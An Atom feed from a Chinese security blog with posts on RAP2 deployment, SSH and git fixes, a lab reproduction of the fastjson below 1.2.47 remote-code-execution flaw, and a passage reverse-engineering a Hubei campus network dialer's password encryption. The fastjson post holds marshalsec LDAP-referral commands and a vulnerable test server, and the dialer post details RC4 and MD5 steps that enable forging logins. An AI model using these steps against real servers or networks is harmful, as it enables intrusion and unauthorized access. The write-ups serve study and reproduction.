<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Akkuman Blog</title>
  
  <subtitle>web安全与二进制路上挣扎前行的自留地</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://hacktech.cn/"/>
  <updated>2019-11-13T05:11:10.980Z</updated>
  <id>http://hacktech.cn/</id>
  
  <author>
    <name>Akkuman</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>RAP2 前后端开发利器搭建</title>
    <link href="http://hacktech.cn/2019/10/12/rap2-api-manage-building.html"/>
    <id>http://hacktech.cn/2019/10/12/rap2-api-manage-building.html</id>
    <published>2019-10-12T12:55:12.000Z</published>
    <updated>2019-11-13T05:11:10.980Z</updated>
    
    <content type="html"><![CDATA[<p>RAP2 是一个api管理系统，前后端协作开发的利器。</p><p>在线体验地址<a href="http://rap2.taobao.org" target="_blank" rel="noopener">http://rap2.taobao.org</a></p><p>Web接口管理工具，开源免费，接口自动化，MOCK数据自动生成，自动化测试，企业级管理。</p><p>有一份一键搭建的docker-compose.yml，但是已经是比较老的前端了，具体可以查看<a href="https://hub.docker.com/r/taomaree/rap2" target="_blank" rel="noopener">https://hub.docker.com/r/taomaree/rap2</a></p><p>我这里把他的docker-compose.yml贴出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">version: &apos;2.2&apos;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  delos:</span><br><span class="line">    container_name: rap2-delos</span><br><span class="line">    image: taomaree/rap2:1.0.6</span><br><span class="line">    environment:</span><br><span class="line">      - MYSQL_URL=rap2-mysql</span><br><span class="line">      - MYSQL_PORT=3306</span><br><span class="line">      - MYSQL_USERNAME=rap2</span><br><span class="line">      - MYSQL_PASSWD=rap2delos</span><br><span class="line">      - MYSQL_SCHEMA=RAP2_DELOS_APP</span><br><span class="line">      - REDIS_URL=rap2-redis</span><br><span class="line">      - REDIS_PORT=6379</span><br><span class="line">      - NODE_ENV=production</span><br><span class="line">    working_dir: /app/rap2-delos/dist</span><br><span class="line">    volumes:</span><br><span class="line">      - &quot;/srv/rap2-mysql/mysql-backup:/backup&quot;</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;38080:80&quot;  # expose 38080</span><br><span class="line">    links:</span><br><span class="line">      - redis</span><br><span class="line">      - mysql</span><br><span class="line">    depends_on:</span><br><span class="line">      - redis</span><br><span class="line">      - mysql</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  redis:</span><br><span class="line">    container_name: rap2-redis</span><br><span class="line">    image: redis:4.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  mysql:</span><br><span class="line">    container_name: rap2-mysql</span><br><span class="line">    image: mysql:8.0</span><br><span class="line">    #ports:</span><br><span class="line">    #   - 33306:3306</span><br><span class="line">    volumes:</span><br><span class="line">      - &quot;/srv/rap2-mysql/mysql-data:/var/lib/mysql&quot;</span><br><span class="line">    command: mysqld --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci --init-connect=&apos;SET NAMES utf8mb4;&apos; --default-authentication-plugin=mysql_native_password --innodb-flush-log-at-trx-commit=0 </span><br><span class="line">    environment:</span><br><span class="line">      - MYSQL_ALLOW_EMPTY_PASSWORD=yes</span><br><span class="line">      - MYSQL_DATABASE=RAP2_DELOS_APP</span><br><span class="line">      - MYSQL_USER=rap2</span><br><span class="line">      - MYSQL_PASSWORD=rap2delos</span><br><span class="line"></span><br><span class="line">  rap2-init:</span><br><span class="line">    container_name: rap2-init</span><br><span class="line">    image: taomaree/rap2:1.0.6</span><br><span class="line">    environment:</span><br><span class="line">      - MYSQL_URL=rap2-mysql</span><br><span class="line">      - MYSQL_PORT=3306</span><br><span class="line">      - MYSQL_USERNAME=rap2</span><br><span class="line">      - MYSQL_PASSWD=rap2delos</span><br><span class="line">      - MYSQL_SCHEMA=RAP2_DELOS_APP</span><br><span class="line">      - REDIS_URL=rap2-redis</span><br><span class="line">      - REDIS_PORT=6379</span><br><span class="line">      - NODE_ENV=production</span><br><span class="line">    working_dir: /app/rap2-delos</span><br><span class="line">    #command: &apos;mysql -h$&#123;MYSQL_URL&#125; -u$&#123;MYSQL_USERNAME&#125; -p$&#123;MYSQL_PASSWD&#125; -e &quot;select * from $&#123;MYSQL_SCHEMA&#125;.Users;&quot; || npm run create-db&apos;</span><br><span class="line">    command: [&quot;bash&quot;, &quot;-c&quot;, &quot;sleep 30 &amp;&amp; mysql -h$$&#123;MYSQL_URL&#125; -u$$&#123;MYSQL_USERNAME&#125; -p$$&#123;MYSQL_PASSWD&#125; -e \&quot;select * from $$&#123;MYSQL_SCHEMA&#125;.Users;\&quot; || node dist/scripts/init&quot;]</span><br><span class="line">    links:</span><br><span class="line">      - redis</span><br><span class="line">      - mysql</span><br><span class="line">    depends_on:</span><br><span class="line">      - redis</span><br><span class="line">      - mysql</span><br></pre></td></tr></table></figure><p>注意一下数据挂载目录就行了。然后访问38080端口就ok了</p><p>但是我想要最新的前端。</p><p>这个搭建是稍微有点复杂的</p><p>启动后端</p><p>使用官方贴出的docker-compose.yml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir rap2</span><br><span class="line">cd rap2</span><br><span class="line"></span><br><span class="line">wget -c https://raw.githubusercontent.com/thx/rap2-delos/master/docker-compose.yml</span><br><span class="line"></span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure><p>docker起来后，默认是监听38080端口，你可以按照自己的喜好编辑docker-compose.yml，并且这个是允许跨域的，跨域规则比较松，Allow-Origin是*，所以你可以把前端部署在任何地方，不过我习惯部署在同一个域名下。</p><p>部署前端</p><p>首先下载前端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/thx/rap2-dolores.git</span><br></pre></td></tr></table></figure><p>然后修改前端的配置，这一步是为了与后端对接</p><p>我是打算把整个服务部署在 mock.test.com 域名下，然后 <a href="http://mock.test.com/api" target="_blank" rel="noopener">http://mock.test.com/api</a> 作为接口的根url（这里需要靠nginx来重写）</p><p>那么我们需要修改前端的配置文件</p><p>进入我们刚才clone下来的目录 rap2-dolores/src/config下，修改 config.prod.ts 文件</p><p><img src="/images/1106918-20191012205633755-1398708534.png" alt=""></p><p>只需要修改 serve 字段的值即可。</p><p>然后编译前端，这里我使用淘宝的源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd rap2-dolores</span><br><span class="line"></span><br><span class="line">npm  install --registry=https://registry.npm.taobao.org</span><br><span class="line"></span><br><span class="line">npm run build</span><br></pre></td></tr></table></figure><p>编译完成后，rap2-dolores 目录下会出现一个名字为 build 或者 dist 的文件夹，把这个文件夹放到你刚才放docker-compose.yml的目录下（为了以后迁移方便，可以放在任意位置，只需要修改对应的nginx配置即可）</p><p>这里我假定编译出来的是 build 文件夹，放置到docker-compose.yml所在的目录</p><p>那么现在你的目录结构应该是这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">lab@lab-desktop:~/dockers/rap2$ pwd</span><br><span class="line">/home/lab/dockers/rap2</span><br><span class="line">lab@lab-desktop:~/dockers/rap2$ tree -L 1</span><br><span class="line">.</span><br><span class="line">├── docker-compose.yml</span><br><span class="line">├── build</span><br><span class="line">└── docker</span><br><span class="line"></span><br><span class="line">2 directories, 1 file</span><br></pre></td></tr></table></figure><p>然后新建nginx配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/nginx/sites-enabled/mock.test.com.conf</span><br></pre></td></tr></table></figure><p>写入以下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        listen [::]:80;</span><br><span class="line"></span><br><span class="line">        server_name mock.test.com;</span><br><span class="line">        root /home/lab/dockers/rap2/build;</span><br><span class="line"></span><br><span class="line">        # reverse proxy</span><br><span class="line">        location /api/ &#123;</span><br><span class="line">                # 38080后面加/是为了把http://127.0.0.1:38080/api/*反代到http://127.0.0.1:38080/*</span><br><span class="line">                proxy_pass http://127.0.0.1:38080/;  # 38080后面的/是必要的，是否会附加location配置路径与proxy_pass配置的路径后是否有&quot;/&quot;有关，有&quot;/&quot;则不附加</span><br><span class="line">                # 代理配置，可选</span><br><span class="line">                proxy_http_version      1.1;</span><br><span class="line">                proxy_cache_bypass      $http_upgrade;</span><br><span class="line">                </span><br><span class="line">                proxy_set_header Upgrade                        $http_upgrade;</span><br><span class="line">                proxy_set_header Connection             &quot;upgrade&quot;;</span><br><span class="line">                proxy_set_header Host                           $host;</span><br><span class="line">                proxy_set_header X-Real-IP                      $remote_addr;</span><br><span class="line">                proxy_set_header X-Forwarded-For        $proxy_add_x_forwarded_for;</span><br><span class="line">                proxy_set_header X-Forwarded-Proto      $scheme;</span><br><span class="line">                proxy_set_header X-Forwarded-Host       $host;</span><br><span class="line">                proxy_set_header X-Forwarded-Port       $server_port;</span><br><span class="line">        &#125;</span><br><span class="line">        location / &#123;</span><br><span class="line">                # 路由在前端，后端没有真实路由，在路由不存在的 404状态的页面返回 /index.html</span><br><span class="line">                # 这个方式使用场景，你在写React或者Vue项目的时候，没有真实路由</span><br><span class="line">                try_files $uri /index.html;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后重启一下nginx，访问mock.test.com就可以了</p><p>这里给出一份比较详尽的nginx配置教程</p><ul><li>Nginx 代理转发，让生产和测试环境 React、Vue 项目轻松访问 API，前端路由不再 404 <a href="https://juejin.im/entry/58df166a0ce463005821e9d9" target="_blank" rel="noopener">https://juejin.im/entry/58df166a0ce463005821e9d9</a></li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://blog.csdn.net/zhangliangzi/article/details/78257593" target="_blank" rel="noopener">Nginx——location常见配置指令，alias、root、proxy_pass</a></li><li><a href="https://github.com/taomaree/docker-rap2" target="_blank" rel="noopener">https://github.com/taomaree/docker-rap2</a></li><li><a href="https://github.com/thx/rap2-delos/wiki/docker" target="_blank" rel="noopener">https://github.com/thx/rap2-delos/wiki/docker</a></li><li><a href="https://github.com/thx/rap2-delos/issues/119#issuecomment-392762261" target="_blank" rel="noopener">https://github.com/thx/rap2-delos/issues/119#issuecomment-392762261</a></li><li><a href="https://github.com/thx/rap2-dolores" target="_blank" rel="noopener">https://github.com/thx/rap2-dolores</a></li><li><a href="https://incoder.org/2018/03/27/rap2/" target="_blank" rel="noopener">Api 文档管理系统 RAP2环境搭建</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;RAP2 是一个api管理系统，前后端协作开发的利器。&lt;/p&gt;
&lt;p&gt;在线体验地址&lt;a href=&quot;http://rap2.taobao.org&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://rap2.taobao.org&lt;/a&gt;&lt;/p&gt;
&lt;
      
    
    </summary>
    
      <category term="配置与搭建" scheme="http://hacktech.cn/categories/%E9%85%8D%E7%BD%AE%E4%B8%8E%E6%90%AD%E5%BB%BA/"/>
    
    
      <category term="问题解决" scheme="http://hacktech.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
      <category term="配置与搭建" scheme="http://hacktech.cn/tags/%E9%85%8D%E7%BD%AE%E4%B8%8E%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>fastjson&lt;1.2.47 RCE 漏洞复现</title>
    <link href="http://hacktech.cn/2019/07/15/fastjson-under-1.2.47-rce.html"/>
    <id>http://hacktech.cn/2019/07/15/fastjson-under-1.2.47-rce.html</id>
    <published>2019-07-15T08:16:12.000Z</published>
    <updated>2019-11-13T05:11:10.976Z</updated>
    
    <content type="html"><![CDATA[<p>这两天爆出了 fastjson 的老洞，复现简单记录一下。</p><p>首先使用 spark 搭建一个简易的利用 fastjson 解析 json 的 http server。</p><a id="more"></a><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.hacktech.fastjsonserver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> spark.Spark.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        get(<span class="string">"/hello"</span>, (req, res) -&gt; <span class="string">"spark server start success"</span>);</span><br><span class="line">        post(<span class="string">"/test"</span>, (req, res) -&gt; &#123;</span><br><span class="line">            String payload = req.body();</span><br><span class="line">            JSON.parse(payload);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"json payload："</span> + payload;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译出来后，启动这个 jar，在 <code>/test</code> 这个 post 点即可 post json payload。</p><p>然后这里分两类：</p><ol><li>如果只是想检测漏洞是否存在，可以使用 dnslog 去检测</li><li>利用的话，需要自己起一个恶意的 ldap 或者 rmi 服务</li></ol><p>本机需要起一个 LDAP 服务和 http 服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc--&gt;LDAP--&gt;http</span><br></pre></td></tr></table></figure><p>poc 会通过上面的路径去请求你的 http 服务上面的对应的 class 文件然后去解析执行这个 class</p><p>启动 LDAP 用的 marshalsec，会比较方便。</p><ol><li>在本目录下启动 http server 在 80 端口</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure><ol start="2"><li>启动 LDAP 服务</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/#Exploit</span><br></pre></td></tr></table></figure><p>后面的 Exploit 是指 Exploit.class 文件</p><ol start="3"><li>运行 PoC，它会请求 LDAP 服务，或者直接把 json payload post 到 <code>/test</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp fastjson-1.2.47.jar; PoC</span><br></pre></td></tr></table></figure><p>其中代码编译的话，直接执行 <code>javac the.java</code> 即可，不过 PoC.java 的编译需要引入 fastjson jar 包，运行 <code>javac -cp ./fastjson-1.2.47.jar PoC.java</code></p><p>具体的细节可见<a href="https://www.lanzous.com/i4zzqej" target="_blank" rel="noopener">代码打包文件</a></p><h2 id="复现遇到一些坑"><a href="#复现遇到一些坑" class="headerlink" title="复现遇到一些坑"></a>复现遇到一些坑</h2><p>这次的这个洞是有 jdk 版本要求的。</p><p>最开始我在我本机测试通过，原因是因为它请求不到 class 的时候会去本目录下进行一个查找，也就是并没有经过 http 服务器。</p><p>所以想要复现这个漏洞的话，需要 target 主机上面的 jdk 版本有严格的要求，具体见下图</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/20190716164141951_25963.png" alt=""></p><p>所以建议复现流程是</p><h2 id="建议复现流程"><a href="#建议复现流程" class="headerlink" title="建议复现流程"></a>建议复现流程</h2><ol><li>起一个虚拟机专门用来运行我写的那个简易的 fastjsonserver，或者你可以直接在虚拟机上面执行 PoC，关键在于 target 机器的 jdk 版本。</li><li>你可以在本机起 ldap/rmi 服务以及 http 服务，或者全部在虚拟机上运行也可以，但是一般真实情况下我们是在外部构造恶意的 ldap/rmi 以及 http server，所以建议这步放到虚拟机外运行。</li><li>根据你的网络环境修改 PoC。</li><li>然后 post payload 或者运行 PoC，即可看到虚拟机上弹出了计算器。</li></ol><p><strong>低版本的java 8u112</strong><br>链接: <a href="https://pan.baidu.com/s/1Q3lGG2b4I8aTXpQbmvK2dw" target="_blank" rel="noopener">https://pan.baidu.com/s/1Q3lGG2b4I8aTXpQbmvK2dw</a> 提取码: 36mm</p><p><strong>复现视频链接</strong>：<a href="https://www.lanzous.com/i50ip3g" target="_blank" rel="noopener">复现流程.zip</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这两天爆出了 fastjson 的老洞，复现简单记录一下。&lt;/p&gt;
&lt;p&gt;首先使用 spark 搭建一个简易的利用 fastjson 解析 json 的 http server。&lt;/p&gt;
    
    </summary>
    
      <category term="Hacker" scheme="http://hacktech.cn/categories/Hacker/"/>
    
    
      <category term="Hacker" scheme="http://hacktech.cn/tags/Hacker/"/>
    
  </entry>
  
  <entry>
    <title>Bad owner or permissions on .ssh/config win10问题解决</title>
    <link href="http://hacktech.cn/2019/07/15/bad-owner-or-permissions-ssh-win10.html"/>
    <id>http://hacktech.cn/2019/07/15/bad-owner-or-permissions-ssh-win10.html</id>
    <published>2019-07-15T02:35:06.000Z</published>
    <updated>2019-11-13T05:11:10.976Z</updated>
    
    <content type="html"><![CDATA[<p>最近向系统添加了新用户账号后出现了问题，尝试使用私钥登陆服务器，提示了 Bad owner or permissions on .ssh/config 这个报错，就是如题中的问题</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/1106918-20190715102859616-1893463244.png" alt=""></p><a id="more"></a><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>按照Windows 10 GUI中的这些步骤解决权限问题：</p><ol><li>找到.ssh文件夹。它通常位于C:\Users\，例如C:\Users\Akkuman。</li><li>右键单击.ssh文件夹，然后单击“属性”。</li><li>找到并点击“安全”标签。</li><li>然后单击“高级”。</li><li>单击“禁用继承”，单击“确定”。</li><li>将出现警告弹出窗口。单击“从此对象中删除所有继承的权限”。</li><li>你会注意到所有用户都将被删除。让我们添加所有者。在同一窗口中，单击“编辑”按钮。</li><li>接下来，单击“添加”以显示“选择用户或组”窗口。</li><li>单击“高级”，然后单击“立即查找”按钮。应显示用户结果列表。</li><li>选择您的用户帐户。</li></ol><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/微信截图_20190715111545.png" alt=""></p><ol start="11"><li>然后单击“确定”（大约三次）以关闭所有窗口。</li></ol><p>完成所有操作后，再次关闭并打开cmder应用程序并尝试连接到远程SSH主机。</p><p>现在这个问题应该解决了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近向系统添加了新用户账号后出现了问题，尝试使用私钥登陆服务器，提示了 Bad owner or permissions on .ssh/config 这个报错，就是如题中的问题&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/akkuman/pic/master/img/1106918-20190715102859616-1893463244.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="问题解决" scheme="http://hacktech.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
    
      <category term="问题解决" scheme="http://hacktech.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
  </entry>
  
  <entry>
    <title>git彻底删除或变更子模块</title>
    <link href="http://hacktech.cn/2019/05/23/git-rm-or-change-submodule.html"/>
    <id>http://hacktech.cn/2019/05/23/git-rm-or-change-submodule.html</id>
    <published>2019-05-23T06:30:00.000Z</published>
    <updated>2019-11-13T05:11:10.976Z</updated>
    
    <content type="html"><![CDATA[<p>今天遇到一个很怪的问题，我想把我的一个子模块切换到另一个上游，我按照网上的方法删除子模块然后新建后，这个子模块依旧跟踪着我先前的上游。自己摸索了一下，可能方法比较傻，不过是可行的，希望能给大家一些帮助。</p><a id="more"></a><ol><li>使原先子模块不被版本控制（先把子模块从版本控制系统移除）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rm --cached /path/to/files</span><br></pre></td></tr></table></figure><ol start="2"><li>删除子模块目录</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /path/to/files</span><br></pre></td></tr></table></figure><ol start="3"><li>修改 .gitmodules，移除这个 submodule</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-[submodule &quot;themes/next&quot;]</span><br><span class="line">-path = themes/next</span><br><span class="line">-url = https://github.com/theme-next/hexo-theme-next.git</span><br></pre></td></tr></table></figure><ol start="3"><li>修改 <code>.git/config</code> 内容，把需要删除的 submodule 配置项删除</li><li>修改 <code>.git/modules</code> 文件夹内容，把你想要删除的子模块目录删除（这项十分重要，或者你知道怎么修改也可以修改，不然导致的后果就是你改过来的同名子模块依然跟踪着之前的分支，git pull 也没法拉取你在 .gitmosules 中新定义的上游地址）</li><li>后面再按照普通的方法添加子模块即可</li></ol><p>一些子模块的操作可以参见<a href="https://blog.chh.tw/posts/git-submodule/" target="_blank" rel="noopener">Git Submodule 用法筆記</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天遇到一个很怪的问题，我想把我的一个子模块切换到另一个上游，我按照网上的方法删除子模块然后新建后，这个子模块依旧跟踪着我先前的上游。自己摸索了一下，可能方法比较傻，不过是可行的，希望能给大家一些帮助。&lt;/p&gt;
    
    </summary>
    
      <category term="git" scheme="http://hacktech.cn/categories/git/"/>
    
    
      <category term="git" scheme="http://hacktech.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>湖北校园网PC端拨号算法逆向</title>
    <link href="http://hacktech.cn/2019/05/21/re-hubei-feiyoung-pc-version.html"/>
    <id>http://hacktech.cn/2019/05/21/re-hubei-feiyoung-pc-version.html</id>
    <published>2019-05-21T05:50:00.000Z</published>
    <updated>2019-11-13T05:11:10.980Z</updated>
    
    <content type="html"><![CDATA[<h1 id="湖北校园网PC端拨号算法逆向"><a href="#湖北校园网PC端拨号算法逆向" class="headerlink" title="湖北校园网PC端拨号算法逆向"></a>湖北校园网PC端拨号算法逆向</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上一文 <a href="https://www.anquanke.com/post/id/178484" target="_blank" rel="noopener">PPPoE中间人拦截以及校园网突破漫谈</a>我们谈到使用 PPPoE 拦截来获取真实的账号密码。<br>在这个的基础上，我对我们湖北的客户端进行了逆向，得到了拨号加密算法。</p><a id="more"></a><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>首先查壳，发现这个版本没壳了，我记得之前好像是加过 vmp 的呀，不管了。<br>然后我们看看目录下的 dll 导出表看看有没有什么好东西</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/20190521135332_AidcComm_Export.png" alt=""></p><p>AidcComm.dll 里面有这些东西，看来这个极大可能会是我们的目标。</p><p>我们再看看主程序的导入表，发现主程序的导入表里面并没有这个 dll，那我们动态调试的时候应该怎么断到这个 dll 中去呢。<br>没有导入表说明没有 .lib，那有可能是通过 LoadLibrary 加载的 dll，至于自实现 peloader，我觉得应该这个软件应该不会是这样。<br>看看就知道了。<br>直接用 x32dbg 和 IDA 开始看。</p><h2 id="逆向过程"><a href="#逆向过程" class="headerlink" title="逆向过程"></a>逆向过程</h2><p>x32dbg 打开主程序，然后 <code>bp LoadLibraryW</code>，再重新载入程序，我们可以一步步运行发现 AidcComm.dll 被载入了。<br>然后运行到用户代码处</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/20190521140452_x32dbg_load_aidccomm.png" alt=""></p><p>我们可以看到此时 eax 寄存器的值为 55870000，这个就是 LoadLibrary 返回的 HANDLE。一般思路来说，接下来就是用 GetProcAddress 获取导出表函数的地址了。<br>继续往下走几步，即可发现我们的猜测并没有错误。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/20190521141007.png" alt=""></p><p>从这张图我们可以看到主程序获取了 AidcComm.GetPWD 和 AidcComm.GetRegularAccount 的地址。<br>那我们通过 call 之后的 eax 跳转过去在这两个函数的地址下断，直接跑起来。<br>然后我们会发现在 AidcComm.GetRegularAccount 断下来了，传入的参数可以在堆栈窗口中看到。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/20190521142139.png" alt=""></p><p>我们去 IDA 分析 GetRegularAccount 这个函数，同时在调试器这边动态跟（这个我已经分析过了，所以有的变量和函数名我已经改过了）</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/20190521142257.png" alt=""></p><p>首先最直观的就是账号的变换，账号只需要加上前缀 <code>!^Wnds0</code> 即可（但其实加密出来后，主程序这个给它又加了一个后缀 <code>@hbxy</code>）。（从调试器可以看到）<br>密码我们直接跟到 GetPWD 里面去看。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/20190521143020.png" alt=""></p><p>通过调试器我们可以观察出，这个分支结构只会执行 <code>a2 == 1</code> 这个分支。<br>看来是通过下面这个函数加密的了。（我给他改了名 encryptPwdWithKey）<br>我们进到 <code>encryptPwdWithKey(void *password, char *key, rsize_t SizeInBytes)</code> 这个函数去查看。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/20190521143504.png" alt=""></p><p>通过分析我们可以得出大致上的流程</p><ol><li>password 用 key RC4 一下得到 A</li><li>把 A md5 一下得到 B，如果第 11 位为奇数，取 B 的前 16 位，偶数就后 16 位，得到 C</li><li>C 再用 key RC4 一下得到 D</li><li>D 再 md5 一下，取 [8:24]得到 E</li></ol><p>也就是最后得到的 E 是加密之后的。</p><p>可能有的小伙伴不明白为什么会是 RC4，这里有几个提示的地方，第一是这个字符串的提示，第二是 RC4 加密流程是很容易分辨的，这个靠经验了。</p><p>但是我们发现我们截取出来的密码和这个是有点小不一样的。通过调试，可以看到在 GetRegularAccount 函数加密出来后，又调用了一个函数，这个函数我给它重命名为 fixHBKey 了。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/20190521144314.png" alt=""></p><p>我们跟进去看看</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/20190521144424.png" alt=""></p><p>代码并不长，我们可以直接调试器分析，如果你想用 IDA 也是可以的，IDA 可以搜索上图中的 <code>&lt;&lt;&lt; FixHBKey: %s &lt;&lt;&lt;</code> 这个字符串来定位这个函数。<br>或者我们可以看到这个函数的入口地址为 <code>001115D0</code>，这个 exe 的加载基址我们可以往上滑到顶看到为 <code>000F1000</code>，两个之间的差值为 <code>205D0</code>，<br>然后再把这个差值加上 